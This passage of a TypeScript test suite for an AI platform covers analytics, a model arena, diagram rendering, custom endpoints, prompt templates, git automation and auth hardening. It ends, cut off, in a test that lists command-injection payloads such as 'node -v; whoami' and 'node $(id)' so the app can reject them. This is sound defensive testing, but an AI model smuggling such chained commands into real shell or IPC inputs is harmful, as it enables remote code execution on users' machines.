      db.addMessage({
        id: `msg_ana_1_${Date.now()}`,
        conversationId: conv.id,
        role: 'user',
        content: 'Hello Cortex! How does zero-cost AI model routing work in practice?',
        createdAt: new Date().toISOString(),
      }, testUser1.id);

      db.addMessage({
        id: `msg_ana_2_${Date.now()}`,
        conversationId: conv.id,
        role: 'assistant',
        content: 'Zero-cost AI routing works by evaluating incoming prompt complexity and dynamically directing requests to free-tier cloud models like Gemini 3.8 Flash, OpenRouter free community models, or local Ollama instances, completely bypassing metered token charges.',
        createdAt: new Date().toISOString(),
      }, testUser1.id);

      const app = express();
      app.use(express.json());
      app.use('/api', apiRouter);

      const server = await new Promise<any>((resolve) => {
        const s = app.listen(0, '127.0.0.1', () => resolve(s));
      });
      const port = (server.address() as any).port;
      const { accessToken } = generateTokens(testUser1);

      try {
        const res = await fetch(`http://127.0.0.1:${port}/api/analytics/usage-summary`, {
          method: 'GET',
          headers: {
            Authorization: `Bearer ${accessToken}`,
          },
        });

        assert.strictEqual(res.status, 200, 'Must return 200 OK');
        const data = await res.json();
        assert.strictEqual(data.success, true);
        assert.strictEqual(data.userId, testUser1.id);
        assert.ok(data.summary.totalTokens > 0, 'Total tokens must be > 0');
        assert.ok(data.summary.totalPromptTokens > 0, 'Prompt tokens must be > 0');
        assert.ok(data.summary.totalCompletionTokens > 0, 'Completion tokens must be > 0');
        assert.strictEqual(data.summary.actualCostCharged, 0.00, 'Actual cost charged must be 0.00');
        assert.ok(data.summary.totalCostSaved >= 0, 'Cost saved must be non-negative');
        assert.ok(data.summary.tokensByModel['gemini-3.8-flash'] > 0, 'Model breakdown must record gemini tokens');
        assert.ok(data.summary.tokensByProvider['gemini'] > 0, 'Provider breakdown must record gemini tokens');
      } finally {
        server.close();
      }
    });

    it('enforces multi-tenant data isolation on usage analytics summary', async () => {
      const app = express();
      app.use(express.json());
      app.use('/api', apiRouter);

      const server = await new Promise<any>((resolve) => {
        const s = app.listen(0, '127.0.0.1', () => resolve(s));
      });
      const port = (server.address() as any).port;
      const { accessToken: u2Token } = generateTokens(testUser2);

      try {
        const res = await fetch(`http://127.0.0.1:${port}/api/analytics/usage-summary`, {
          method: 'GET',
          headers: {
            Authorization: `Bearer ${u2Token}`,
          },
        });

        assert.strictEqual(res.status, 200);
        const data = await res.json();
        assert.strictEqual(data.userId, testUser2.id);
        assert.strictEqual(data.summary.totalConversations, 0);
        assert.strictEqual(data.summary.totalTokens, 0);
      } finally {
        server.close();
      }
    });

    it('rejects unauthenticated requests to usage summary with 401', async () => {
      const app = express();
      app.use(express.json());
      app.use('/api', apiRouter);

      const server = await new Promise<any>((resolve) => {
        const s = app.listen(0, '127.0.0.1', () => resolve(s));
      });
      const port = (server.address() as any).port;

      try {
        const res = await fetch(`http://127.0.0.1:${port}/api/analytics/usage-summary`);
        assert.strictEqual(res.status, 401, 'Unauthenticated request must return 401');
      } finally {
        server.close();
      }
    });
  });


  describe('19. Side-by-Side Dual Model Arena & Blind Comparison (POST /api/arena/vote, GET /api/arena/votes)', () => {
    it('records developer evaluation preference and latency telemetry via POST /api/arena/vote', async () => {
      const app = express();
      app.use(express.json());
      app.use('/api', apiRouter);

      const server = await new Promise<any>((resolve) => {
        const s = app.listen(0, '127.0.0.1', () => resolve(s));
      });
      const port = (server.address() as any).port;
      const { accessToken } = generateTokens(testUser1);

      try {
        const res = await fetch(`http://127.0.0.1:${port}/api/arena/vote`, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            Authorization: `Bearer ${accessToken}`,
          },
          body: JSON.stringify({
            prompt: 'Explain CAP theorem in simple distributed systems terms',
            modelA: 'gemini-3.8-flash',
            modelB: 'meta-llama-3.3-70b-instruct:free',
            winner: 'model_a',
            latencyMsA: 340,
            latencyMsB: 580,
          }),
        });

        assert.strictEqual(res.status, 200, 'Must return 200 OK');
        const data = await res.json();
        assert.strictEqual(data.success, true);
        assert.strictEqual(data.vote.winner, 'model_a');
        assert.strictEqual(data.vote.modelA, 'gemini-3.8-flash');
        assert.strictEqual(data.vote.modelB, 'meta-llama-3.3-70b-instruct:free');
        assert.strictEqual(data.vote.latencyMsA, 340);
        assert.strictEqual(data.vote.latencyMsB, 580);
        assert.strictEqual(data.vote.userId, testUser1.id);
      } finally {
        server.close();
      }
    });

    it('rejects invalid winner categories with 400 Bad Request', async () => {
      const app = express();
      app.use(express.json());
      app.use('/api', apiRouter);

      const server = await new Promise<any>((resolve) => {
        const s = app.listen(0, '127.0.0.1', () => resolve(s));
      });
      const port = (server.address() as any).port;
      const { accessToken } = generateTokens(testUser1);

      try {
        const res = await fetch(`http://127.0.0.1:${port}/api/arena/vote`, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            Authorization: `Bearer ${accessToken}`,
          },
          body: JSON.stringify({
            prompt: 'Sample prompt',
            modelA: 'gemini-3.8-flash',
            modelB: 'meta-llama-3.3-70b-instruct:free',
            winner: 'invalid_category_test',
          }),
        });

        assert.strictEqual(res.status, 400);
        const data = await res.json();
        assert.ok(data.error.includes('Invalid winner'));
      } finally {
        server.close();
      }
    });

    it('retrieves user voting history and enforces multi-tenant data isolation', async () => {
      const app = express();
      app.use(express.json());
      app.use('/api', apiRouter);

      const server = await new Promise<any>((resolve) => {
        const s = app.listen(0, '127.0.0.1', () => resolve(s));
      });
      const port = (server.address() as any).port;
      const { accessToken: u1Token } = generateTokens(testUser1);
      const { accessToken: u2Token } = generateTokens(testUser2);

      try {
        const res1 = await fetch(`http://127.0.0.1:${port}/api/arena/votes`, {
          headers: { Authorization: `Bearer ${u1Token}` },
        });
        const data1 = await res1.json();
        assert.strictEqual(res1.status, 200);
        assert.ok(data1.votes.length >= 1, 'User 1 should see their vote');

        const res2 = await fetch(`http://127.0.0.1:${port}/api/arena/votes`, {
          headers: { Authorization: `Bearer ${u2Token}` },
        });
        const data2 = await res2.json();
        assert.strictEqual(res2.status, 200);
        assert.strictEqual(data2.votes.length, 0, 'User 2 should see 0 votes (isolated)');
      } finally {
        server.close();
      }
    });

    it('rejects unauthenticated requests to arena voting endpoints with 401', async () => {
      const app = express();
      app.use(express.json());
      app.use('/api', apiRouter);

      const server = await new Promise<any>((resolve) => {
        const s = app.listen(0, '127.0.0.1', () => resolve(s));
      });
      const port = (server.address() as any).port;

      try {
        const res = await fetch(`http://127.0.0.1:${port}/api/arena/votes`);
        assert.strictEqual(res.status, 401);
      } finally {
        server.close();
      }
    });
  });


  describe('20. Interactive Architecture Diagram & Workflow Visualizer', () => {
    it('parses standard flowchart syntax into structured nodes and relational links', () => {
      const source = `flowchart TD
        Client["Browser Client"] -->|HTTPS /api/chat| Router["Model Router"]
        Router --> Gemini["Google Gemini 3.8 Flash"]
        Router --> Ollama["Local Ollama Offline"]`;

      const diagram = parseMermaid(source);
      assert.strictEqual(diagram.type, 'flowchart');
      assert.strictEqual(diagram.direction, 'TB');
      assert.ok(diagram.nodes.length >= 4, 'Must parse at least 4 nodes');
      assert.ok(diagram.links.length >= 3, 'Must parse at least 3 links');

      const clientNode = diagram.nodes.find((n) => n.id === 'Client');
      assert.ok(clientNode, 'Client node must exist');
      assert.strictEqual(clientNode?.label, 'Browser Client');
    });

    it('parses sequence diagrams into participants and sequential interactions', () => {
      const source = `sequenceDiagram
        User ->> Frontend: Clicks Voice Button
        Frontend ->> SpeechAPI: Requests Mic Audio
        SpeechAPI -->> Frontend: Stream Transcript
        Frontend ->> Server: Dispatches Prompt`;

      const diagram = parseMermaid(source);
      assert.strictEqual(diagram.type, 'sequence');
      assert.ok(diagram.nodes.length >= 3, 'Must parse participants');
      assert.ok(diagram.links.length >= 4, 'Must parse sequence messages');
      assert.ok(diagram.links.some((l) => l.label && l.label.includes('Stream Transcript')));
    });

    it('generates high-resolution standards-compliant SVG with styling and markers', () => {
      const source = `graph LR
        A["Input Artifact"] --> B["Analysis Engine"]
        B --> C["Export Report"]`;

      const diagram = parseMermaid(source);
      const svg = renderDiagramToSvg(diagram);

      assert.ok(svg.startsWith('<?xml'), 'Must start with XML declaration');
      assert.ok(svg.includes('<svg xmlns="http://www.w3.org/2000/svg"'), 'Must contain SVG root');
      assert.ok(svg.includes('id="arrowhead"'), 'Must contain arrowhead marker definition');
      assert.ok(svg.includes('class="diagram-node"'), 'Must contain diagram nodes');
      assert.ok(svg.includes('class="diagram-link"'), 'Must contain diagram links');
    });

    it('sanitizes XML special characters in node labels against injection', () => {
      const source = `graph TD
        X["Security <Audit> & 'Sanitization' \"Check\""] --> Y["Clean Node"]`;

      const diagram = parseMermaid(source);
      const svg = renderDiagramToSvg(diagram);

      assert.ok(!svg.includes('<Audit>'), 'Must not contain raw unescaped HTML tags');
      assert.ok(svg.includes('&lt;Audit&gt;'), 'Must contain XML-escaped brackets');
      assert.ok(svg.includes('&amp;'), 'Must contain XML-escaped ampersand');
    });
  });

  describe('21. Custom OpenAI-Compatible Endpoints & Local Inference Cluster Manager', () => {
    const customEndpoint1 = {
      id: `ep_vllm_${Date.now()}`,
      userId: '',
      name: 'vLLM Local Cluster',
      baseUrl: 'http://localhost:8000/v1',
      apiKey: 'vllm-token-abc',
      defaultModel: 'meta-llama/Llama-3.1-70B-Instruct',
      description: 'On-premise GPU cluster serving vLLM OpenAI-compatible engine',
      contextWindow: 131072,
      isEnabled: true,
      createdAt: new Date().toISOString(),
      updatedAt: new Date().toISOString(),
    };

    it('creates, retrieves, and persists custom endpoints with multi-tenant isolation', () => {
      customEndpoint1.userId = testUser1.id;
      const saved = db.saveCustomEndpoint(customEndpoint1);

      assert.strictEqual(saved.id, customEndpoint1.id);
      assert.strictEqual(saved.name, 'vLLM Local Cluster');
      assert.strictEqual(saved.baseUrl, 'http://localhost:8000/v1');

      // TestUser1 retrieves their endpoint
      const u1Endpoints = db.getCustomEndpoints(testUser1.id);
      assert.ok(u1Endpoints.some((e) => e.id === customEndpoint1.id));

      // TestUser2 does NOT see TestUser1's endpoint (isolation)
      const u2Endpoints = db.getCustomEndpoints(testUser2.id);
      assert.ok(!u2Endpoints.some((e) => e.id === customEndpoint1.id));

      // Direct ID lookup respecting tenant boundary
      const fetchedByU1 = db.getCustomEndpointById(customEndpoint1.id, testUser1.id);
      assert.ok(fetchedByU1);
      assert.strictEqual(fetchedByU1?.defaultModel, 'meta-llama/Llama-3.1-70B-Instruct');

      const fetchedByU2 = db.getCustomEndpointById(customEndpoint1.id, testUser2.id);
      assert.strictEqual(fetchedByU2, undefined, 'User2 must not access User1 endpoint by ID');
    });

    it('augments dynamic model catalog with active custom endpoints and zero-cost pricing', () => {
      const activeEndpoint = { ...customEndpoint1, isEnabled: true };
      const disabledEndpoint = {
        ...customEndpoint1,
        id: `ep_disabled_${Date.now()}`,
        name: 'Disabled LM Studio',
        isEnabled: false,
      };

      const catalogWithCustom = modelCatalog.getModels([activeEndpoint, disabledEndpoint]);

      const foundActive = catalogWithCustom.find((m) => m.id === `custom_${activeEndpoint.id}`);
      assert.ok(foundActive, 'Active custom endpoint must be dynamically registered in catalog');
      assert.strictEqual(foundActive?.providerId, 'custom');
      assert.strictEqual(foundActive?.displayName, 'vLLM Local Cluster (meta-llama/Llama-3.1-70B-Instruct)');
      assert.strictEqual(foundActive?.isFree, true, 'Custom endpoint inference must be marked zero-cost');
      assert.strictEqual(foundActive?.contextWindow, 131072);
      assert.ok(foundActive?.description.includes('Self-hosted OpenAI-compatible inference endpoint'));

      const foundDisabled = catalogWithCustom.find((m) => m.id === `custom_${disabledEndpoint.id}`);
      assert.strictEqual(foundDisabled, undefined, 'Disabled custom endpoints must not appear in model catalog');
    });

    it('ModelRouter routes to custom endpoint without throwing paid inference restriction', () => {
      const resolved = modelRouter.resolveModel({
        requestedModelId: `custom_${customEndpoint1.id}`,
        forceFree: true,
        allowPaidInference: false,
        messages: [{ role: 'user', content: 'Test local inference routing' }],
        userId: testUser1.id,
      });

      assert.strictEqual(resolved.model.id, `custom_${customEndpoint1.id}`);
      assert.strictEqual(resolved.model.providerId, 'custom');
      assert.strictEqual(resolved.model.isFree, true);
    });

    it('deletes custom endpoint safely and maintains DB hygiene', () => {
      const unauthorizedDelete = db.deleteCustomEndpoint(customEndpoint1.id, testUser2.id);
      assert.strictEqual(unauthorizedDelete, false, 'User2 cannot delete User1 endpoint');

      const authorizedDelete = db.deleteCustomEndpoint(customEndpoint1.id, testUser1.id);
      assert.strictEqual(authorizedDelete, true, 'User1 can delete own custom endpoint');

      const u1EndpointsAfter = db.getCustomEndpoints(testUser1.id);
      assert.ok(!u1EndpointsAfter.some((e) => e.id === customEndpoint1.id));
    });
  });

  describe('22. Interactive Prompt Template Library & Custom Persona Hub', () => {
    const customTmpl = {
      id: `tmpl_custom_${Date.now()}`,
      userId: '',
      title: 'FastAPI Microservice Persona',
      description: 'Generates async FastAPI endpoints with Pydantic v2 schemas and pytest fixtures',
      category: 'Engineering' as const,
      prompt: 'Create a production FastAPI service for {{service_name}} handling {{entity}} with Redis caching.',
      tags: ['python', 'fastapi', 'microservice'],
      variables: ['service_name', 'entity'],
      isBuiltin: false,
      createdAt: new Date().toISOString(),
      updatedAt: new Date().toISOString(),
    };

    it('loads curated system prompt templates and retrieves by ID', () => {
      const templates = db.getPromptTemplates(testUser1.id);
      assert.ok(templates.length >= 7, 'Must include at least 7 built-in curated templates');

      const codeReviewTmpl = db.getPromptTemplateById('tmpl_code_review', testUser1.id);
      assert.ok(codeReviewTmpl, 'Must find built-in code review template');
      assert.strictEqual(codeReviewTmpl?.title, 'Code Review & Security Audit');
      assert.strictEqual(codeReviewTmpl?.isBuiltin, true);
      assert.strictEqual(codeReviewTmpl?.category, 'Security');
      assert.ok(codeReviewTmpl?.variables?.includes('language'));
      assert.ok(codeReviewTmpl?.variables?.includes('code'));

      const sysDesignTmpl = db.getPromptTemplateById('tmpl_system_design', testUser1.id);
      assert.ok(sysDesignTmpl);
      assert.strictEqual(sysDesignTmpl?.category, 'Architecture');
      assert.ok(sysDesignTmpl?.variables?.includes('service_name'));
    });

    it('creates and persists custom prompt templates with multi-tenant boundary isolation', () => {
      customTmpl.userId = testUser1.id;
      const saved = db.savePromptTemplate(customTmpl);

      assert.strictEqual(saved.id, customTmpl.id);
      assert.strictEqual(saved.title, 'FastAPI Microservice Persona');
      assert.strictEqual(saved.isBuiltin, false);

      // TestUser1 retrieves their custom template
      const u1Templates = db.getPromptTemplates(testUser1.id);
      assert.ok(u1Templates.some((t) => t.id === customTmpl.id), 'User1 must see their own custom template');

      // TestUser2 does NOT see TestUser1's custom template (isolation)
      const u2Templates = db.getPromptTemplates(testUser2.id);
      assert.ok(!u2Templates.some((t) => t.id === customTmpl.id), 'User2 must not see User1 custom template');

      // Direct lookup respects tenant boundary
      const fetchedByU1 = db.getPromptTemplateById(customTmpl.id, testUser1.id);
      assert.ok(fetchedByU1);
      assert.strictEqual(fetchedByU1?.title, 'FastAPI Microservice Persona');

      const fetchedByU2 = db.getPromptTemplateById(customTmpl.id, testUser2.id);
      assert.strictEqual(fetchedByU2, undefined, 'User2 must not access User1 custom template by ID');
    });

    it('prevents deletion of system built-in templates and unauthorized deletion by other tenants', () => {
      // User2 cannot delete User1's template
      const unauthorizedDelete = db.deletePromptTemplate(customTmpl.id, testUser2.id);
      assert.strictEqual(unauthorizedDelete, false, 'User2 cannot delete User1 custom template');

      // Cannot delete system built-in template
      const builtinDelete = db.deletePromptTemplate('tmpl_code_review', testUser1.id);
      assert.strictEqual(builtinDelete, false, 'System built-in templates must not be deleted');

      // Verify built-in still intact
      const verifyBuiltin = db.getPromptTemplateById('tmpl_code_review', testUser1.id);
      assert.ok(verifyBuiltin, 'Built-in template must remain intact');
    });

    it('deletes custom prompt template safely and maintains database hygiene', () => {
      const authorizedDelete = db.deletePromptTemplate(customTmpl.id, testUser1.id);
      assert.strictEqual(authorizedDelete, true, 'User1 can delete own custom template');

      const u1TemplatesAfter = db.getPromptTemplates(testUser1.id);
      assert.ok(!u1TemplatesAfter.some((t) => t.id === customTmpl.id), 'Custom template should no longer exist');
    });
  });

  describe('23. Automated Semantic Git Commit & Release Notes Generator', () => {
    let gitTestWs: any;
    let gitWsRoot: string;

    before(async () => {
      gitTestWs = db.createWorkspace({
        id: `ws_sem_git_${Date.now()}`,
        userId: testUser1.id,
        name: 'Semantic Git Project',
        description: 'Workspace for automated semantic commit testing',
        createdAt: new Date().toISOString(),
        updatedAt: new Date().toISOString(),
      });
      gitWsRoot = workspaceManager.getWorkspaceRoot(gitTestWs);
      if (!fs.existsSync(gitWsRoot)) {
        fs.mkdirSync(gitWsRoot, { recursive: true });
      }

      const { execSync } = await import('node:child_process');
      execSync('git init && git config user.email "bot@cortex.ai" && git config user.name "Cortex Bot"', {
        cwd: gitWsRoot,
      });

      // Initial baseline commit
      fs.writeFileSync(path.join(gitWsRoot, 'README.md'), '# Semantic Project\nInitial baseline.');
      execSync('git add -A && git commit -m "chore(init): initial repository setup"', { cwd: gitWsRoot });
    });

    it('synthesizes conventional commit messages from workspace diffs and classifies types accurately', async () => {
      // Create a new feature file in auth module
      const authDir = path.join(gitWsRoot, 'src', 'auth');
      if (!fs.existsSync(authDir)) fs.mkdirSync(authDir, { recursive: true });
      fs.writeFileSync(path.join(authDir, 'jwt.ts'), 'export function verifyJwt() { return true; }');

      const res = await workspaceManager.generateSemanticCommit(gitWsRoot, false);

      assert.strictEqual(res.hasChanges, true);
      assert.strictEqual(res.commitType, 'feat');
      assert.strictEqual(res.scope, 'auth');
      assert.ok(res.commitTitle.includes('feat(auth):'));
      assert.ok(res.commitBody.includes('jwt.ts'));
      assert.strictEqual(res.committed, false, 'Should not commit when autoCommit is false');
      assert.ok(res.files.some((f) => f.file.includes('jwt.ts')));
    });

    it('performs atomic git commit when autoCommit flag is enabled', async () => {
      const res = await workspaceManager.generateSemanticCommit(gitWsRoot, true);

      assert.strictEqual(res.committed, true);
      assert.ok(res.commitHash, 'Must return commit SHA hash');
      assert.strictEqual(typeof res.commitHash, 'string');

      // Calling again should report clean working tree
      const cleanCheck = await workspaceManager.generateSemanticCommit(gitWsRoot, false);
      assert.strictEqual(cleanCheck.hasChanges, false);
      assert.ok(cleanCheck.commitTitle.includes('no changes'));
    });

    it('generates structured Release Notes & Changelog Markdown grouping commits', async () => {
      const { execSync } = await import('node:child_process');
      // Add a bug fix commit
      fs.writeFileSync(path.join(gitWsRoot, 'src', 'auth', 'jwt.ts'), 'export function verifyJwt(token: string) { return !!token; }');
      execSync('git add -A && git commit -m "fix(auth): prevent empty token bypass vulnerability"', { cwd: gitWsRoot });

      // Add a performance commit
      fs.writeFileSync(path.join(gitWsRoot, 'src', 'auth', 'cache.ts'), 'export const cache = new Map();');
      execSync('git add -A && git commit -m "perf(auth): add in-memory token validation cache"', { cwd: gitWsRoot });

      const releaseNotes = await workspaceManager.generateReleaseNotes(gitWsRoot, {
        versionTag: 'v2.1.0',
        title: 'Authentication Hardening Milestone',
      });

      assert.strictEqual(releaseNotes.versionTag, 'v2.1.0');
      assert.strictEqual(releaseNotes.title, 'Authentication Hardening Milestone');
      assert.ok(releaseNotes.markdown.includes('# Release Notes: v2.1.0 — Authentication Hardening Milestone'));
      assert.ok(releaseNotes.markdown.includes('### 🚀 New Features'));
      assert.ok(releaseNotes.markdown.includes('### 🐛 Bug Fixes & Stability'));
      assert.ok(releaseNotes.markdown.includes('### ⚡ Performance & Optimization'));
      assert.ok(releaseNotes.stats.totalCommits >= 4);
      assert.ok(releaseNotes.stats.featuresCount >= 1);
      assert.ok(releaseNotes.stats.fixesCount >= 1);
    });

    it('enforces multi-tenant data isolation on workspace git endpoints', () => {
      // TestUser2 cannot access TestUser1 workspace by ID
      const user2WorkspaceLookup = db.getWorkspaceById(gitTestWs.id, testUser2.id);
      assert.strictEqual(user2WorkspaceLookup, undefined, 'User2 cannot access User1 workspace');
    });
  });

  describe('24. Authentication Security Hardening & Regression Suite', () => {
    it('fails closed when JWT_SECRET is missing or empty', () => {
      const origSecret = process.env.JWT_SECRET;
      try {
        delete process.env.JWT_SECRET;

        // Generating tokens must throw fatal error
        assert.throws(
          () => generateTokens(testUser1),
          /FATAL: JWT_SECRET/i,
          'Must throw fatal error failing closed when secret is missing'
        );

        // Verification must return null rather than accepting any token
        const dummyToken = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.e30.t-IDcSemACt8x4iTMCda8Yhe3iZaWbvV5XKSTbuAn0M';
        const verified = verifyAccessToken(dummyToken);
        assert.strictEqual(verified, null, 'Must fail closed and return null on missing secret');

        // Authentication of mock request must return null
        const mockReq = { headers: { authorization: `Bearer ${dummyToken}` } } as any;
        const user = authenticateRequest(mockReq);
        assert.strictEqual(user, null, 'Must fail closed when secret is missing');
      } finally {
        process.env.JWT_SECRET = origSecret;
      }
    });

    it('strictly rejects unauthenticated requests with 401 and never falls back to development user', () => {
      // Seed usr_dev_primary in database to verify middleware does NOT fall back to it
      db.createUser({
        id: 'usr_dev_primary',
        email: 'dev_primary_probe@nexa.ai',
        name: 'Dev Primary Probe',
        passwordHash: 'hash',
        role: 'user',
        createdAt: new Date().toISOString(),
      });

      const mockReq: any = { headers: {}, cookies: {} };
      let statusCode = 0;
      let jsonPayload: any = null;
      let nextCalled = false;

      const mockRes: any = {
        status(code: number) {
          statusCode = code;
          return this;
        },
        json(data: any) {
          jsonPayload = data;
          return this;
        },
      };

      authMiddleware(mockReq, mockRes, () => {
        nextCalled = true;
      });

      assert.strictEqual(nextCalled, false, 'next() must not be called when unauthenticated');
      assert.strictEqual(statusCode, 401, 'Must respond with 401 Unauthorized');
      assert.ok(jsonPayload?.error?.includes('Unauthorized'), 'Error message must specify Unauthorized');
      assert.strictEqual(mockReq.user, undefined, 'req.user must NOT fall back to usr_dev_primary');
    });

    it('rejects query-string tokens to prevent token leakage in URLs and access logs', () => {
      const { accessToken } = generateTokens(testUser1);

      // Create request with token ONLY in query parameter
      const mockReq: any = {
        headers: {},
        cookies: {},
        query: { token: accessToken },
      };

      const extracted = extractToken(mockReq);
      assert.strictEqual(extracted, null, 'Query-string tokens must be ignored and return null');

      const authenticated = authenticateRequest(mockReq);
      assert.strictEqual(authenticated, null, 'Authentication must fail when token is only in query string');

      let statusCode = 0;
      const mockRes: any = {
        status(code: number) {
          statusCode = code;
          return this;
        },
        json() {
          return this;
        },
      };
      let nextCalled = false;
      authMiddleware(mockReq, mockRes, () => {
        nextCalled = true;
      });

      assert.strictEqual(statusCode, 401, 'Must reject query token with 401');
      assert.strictEqual(nextCalled, false);
    });

    it('authenticates requests strictly via Bearer header or cortex_access_token cookie', () => {
      const { accessToken } = generateTokens(testUser1);

      // 1. Bearer header
      const reqBearer: any = {
        headers: { authorization: `Bearer ${accessToken}` },
      };
      const userBearer = authenticateRequest(reqBearer);
      assert.ok(userBearer, 'Must authenticate via Bearer header');
      assert.strictEqual(userBearer?.id, testUser1.id);

      // 2. Parsed cookie
      const reqCookie: any = {
        headers: {},
        cookies: { cortex_access_token: accessToken },
      };
      const userCookie = authenticateRequest(reqCookie);
      assert.ok(userCookie, 'Must authenticate via parsed cookie');
      assert.strictEqual(userCookie?.id, testUser1.id);

      // 3. Raw Cookie header string
      const reqRawCookie: any = {
        headers: { cookie: `session_id=abc; cortex_access_token=${accessToken}; theme=dark` },
      };
      const userRawCookie = authenticateRequest(reqRawCookie);
      assert.ok(userRawCookie, 'Must authenticate via raw Cookie header');
      assert.strictEqual(userRawCookie?.id, testUser1.id);
    });
  });


  describe('25. Workspace Multi-File Search & Replace with Regex and Match Preview', () => {
    let srWs: any;
    let wsRoot: string;

    before(async () => {
      srWs = db.createWorkspace({
        id: `ws_search_replace_${Date.now()}`,
        userId: testUser1.id,
        name: 'Search & Replace Test Workspace',
        description: 'Testing multi-file search and replace',
        createdAt: new Date().toISOString(),
        updatedAt: new Date().toISOString(),
      });
      wsRoot = workspaceManager.getWorkspaceRoot(srWs);

      // Create test files
      await workspaceManager.createFile(
        wsRoot,
        'src/utils.ts',
        `export const API_URL = 'http://api.local';\nexport const api_url = 'http://backup.local';\nexport function getEndpoint() { return API_URL; }`
      );
      await workspaceManager.createFile(
        wsRoot,
        'src/config.ts',
        `export const AppConfig = {\n  url: API_URL,\n  apiUrl: 'http://production.com',\n  mode: 'debug'\n};`
      );
      await workspaceManager.createFile(
        wsRoot,
        'docs/readme.txt',
        `Documentation for API_URL configuration.`
      );
    });

    it('matches case-sensitively and respects whole-word boundary options', async () => {
      // 1. Case-sensitive search for API_URL (should match API_URL only, not api_url or apiUrl)
      const resCase = await workspaceManager.searchAndReplace(wsRoot, {
        query: 'API_URL',
        matchCase: true,
        wholeWord: true,
        dryRun: true,
      });
      assert.strictEqual(resCase.matchCase, true);
      assert.strictEqual(resCase.wholeWord, true);
      assert.ok(resCase.totalMatches >= 3, `Expected at least 3 matches, got ${resCase.totalMatches}`);
      for (const m of resCase.matches) {
        assert.strictEqual(m.matchText, 'API_URL');
      }

      // 2. Case-insensitive search for api_url with wholeWord
      const resInsensitive = await workspaceManager.searchAndReplace(wsRoot, {
        query: 'api_url',
        matchCase: false,
        wholeWord: true,
        dryRun: true,
      });
      assert.ok(resInsensitive.totalMatches >= 4, `Expected at least 4 matches, got ${resInsensitive.totalMatches}`);
      for (const m of resInsensitive.matches) {
        assert.ok(
          m.matchText.toLowerCase() === 'api_url',
          `Match text ${m.matchText} should equal api_url case-insensitively`
        );
      }
    });

    it('filters target search files based on filePattern glob/extension filters', async () => {
      // Only search in *.txt files
      const resTxt = await workspaceManager.searchAndReplace(wsRoot, {
        query: 'API_URL',
        filePattern: '*.txt',
        dryRun: true,
      });
      assert.strictEqual(resTxt.filesCount, 1);
      assert.strictEqual(resTxt.matches[0].file, 'docs/readme.txt');

      // Only search in *.ts files
      const resTs = await workspaceManager.searchAndReplace(wsRoot, {
        query: 'API_URL',
        filePattern: '*.ts',
        dryRun: true,
      });
      assert.strictEqual(resTs.filesCount, 2);
      for (const m of resTs.matches) {
        assert.ok(m.file.endsWith('.ts'));
      }
    });

    it('performs regex search with capture group replacement preview in dry-run mode without mutating disk', async () => {
      const originalUtils = await workspaceManager.readFile(wsRoot, 'src/utils.ts');

      const resRegex = await workspaceManager.searchAndReplace(wsRoot, {
        query: 'export const (\\w+) = (.*);',
        replacement: 'export let $1 = $2;',
        isRegex: true,
        dryRun: true,
      });

      assert.strictEqual(resRegex.isRegex, true);
      assert.strictEqual(resRegex.applied, false, 'Dry run must not set applied = true');
      assert.ok(resRegex.totalMatches >= 2);
      assert.ok(resRegex.filePreviews.length >= 1);

      // Verify diff generation
      const utilsPreview = resRegex.filePreviews.find((p) => p.file === 'src/utils.ts');
      assert.ok(utilsPreview, 'File preview for src/utils.ts must exist');
      assert.ok(utilsPreview.diff.includes('- export const'));
      assert.ok(utilsPreview.diff.includes('+ export let'));

      // Ensure disk was untouched
      const currentUtils = await workspaceManager.readFile(wsRoot, 'src/utils.ts');
      assert.strictEqual(currentUtils.content, originalUtils.content, 'Dry run must not mutate disk content');
    });

    it('executes atomic batch replacement across files on disk when dryRun is false', async () => {
      const resApply = await workspaceManager.searchAndReplace(wsRoot, {
        query: 'http://api.local',
        replacement: 'https://api.cortex.ai/v1',
        isRegex: false,
        dryRun: false,
      });

      assert.strictEqual(resApply.applied, true, 'Replacement must be applied');
      assert.strictEqual(resApply.totalMatches, 1);

      // Verify file content on disk has been updated
      const updatedUtils = await workspaceManager.readFile(wsRoot, 'src/utils.ts');
      assert.ok(
        updatedUtils.content.includes('https://api.cortex.ai/v1'),
        'File on disk must reflect replacement'
      );
      assert.ok(
        !updatedUtils.content.includes('http://api.local'),
        'Original text must be completely replaced'
      );
    });

    it('exposes POST /api/cowork/workspaces/:id/search-replace and enforces tenant isolation', async () => {
      const app = express();
      app.use(express.json());
      app.use('/api', apiRouter);

      const server = await new Promise<any>((resolve) => {
        const s = app.listen(0, '127.0.0.1', () => resolve(s));
      });
      const port = server.address().port;

      const { accessToken: u1Token } = generateTokens(testUser1);
      const { accessToken: u2Token } = generateTokens(testUser2);

      try {
        // 1. Authorized user search and replace preview
        const resPreview = await fetch(`http://127.0.0.1:${port}/api/cowork/workspaces/${srWs.id}/search-replace`, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            Authorization: `Bearer ${u1Token}`,
          },
          body: JSON.stringify({
            query: 'API_URL',
            replacement: 'REMOTE_GATEWAY_URL',
            dryRun: true,
          }),
        });
        assert.strictEqual(resPreview.status, 200);
        const dataPreview = await resPreview.json();
        assert.strictEqual(dataPreview.success, true);
        assert.ok(dataPreview.totalMatches >= 3);
        assert.strictEqual(dataPreview.applied, false);

        // 2. Unauthorized cross-tenant attempt (User2 accessing User1 workspace)
        const resForbidden = await fetch(`http://127.0.0.1:${port}/api/cowork/workspaces/${srWs.id}/search-replace`, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            Authorization: `Bearer ${u2Token}`,
          },
          body: JSON.stringify({
            query: 'API_URL',
            dryRun: true,
          }),
        });
        assert.strictEqual(resForbidden.status, 404, 'Must reject cross-tenant access with 404');

        // 3. Unauthenticated request rejected with 401
        const resUnauth = await fetch(`http://127.0.0.1:${port}/api/cowork/workspaces/${srWs.id}/search-replace`, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({
            query: 'API_URL',
          }),
        });
        assert.strictEqual(resUnauth.status, 401, 'Must reject unauthenticated request with 401');
      } finally {
        server.close();
      }
    });
  });


  describe('26. Electron Desktop IPC Security & RCE Mitigation', () => {
    it('rejects shell chaining operators and command injection vectors', () => {
      const chainingPayloads = [
        'git status && calc.exe',
        'node -v; whoami',
        'python | dir',
        'git log \x60whoami\x60',
        'node $(id)',
        'git status > out.txt',
        'npm < in.txt',
        'git status\ncalc.exe',
        'git status\0whoami',
